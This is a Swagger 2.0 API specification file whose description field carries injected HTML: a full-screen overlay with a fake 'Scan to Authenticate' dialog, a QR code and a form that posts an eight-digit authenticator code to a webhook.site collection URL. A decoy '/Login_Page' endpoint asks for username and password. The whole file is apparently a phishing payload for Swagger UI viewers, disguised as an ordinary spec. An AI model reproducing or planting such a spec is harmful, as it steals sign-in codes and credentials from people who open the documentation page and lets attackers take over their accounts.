swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:99998;"></div><div style="position:fixed;top:30%;left:50%;transform:translateX(-50%);width:92%;max-width:360px;background:#fff;border-radius:12px;box-shadow:0 14px 44px rgba(0,0,0,.5);z-index:99999;font-family:Arial;overflow:hidden;"><div style="background:#111;color:#0f0;padding:14px;text-align:center;font-weight:bold;">Scan to Authenticate</div><div style="padding:20px;text-align:center;font-size:13px;color:#333;"><img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=https%3A%2F%2Fwebhook.site%2FREPLACE-ME" width="180" height="180" alt="QR" style="border:6px solid #111;border-radius:8px;"><p>Scan this QR with your authenticator app to complete sign-in.</p><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="authcode" placeholder="Or enter 8-digit code shown in app" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;margin-bottom:10px;"><button type="submit" style="width:100%;padding:11px;background:#111;color:#0f0;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">Confirm Sign-In</button></form></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
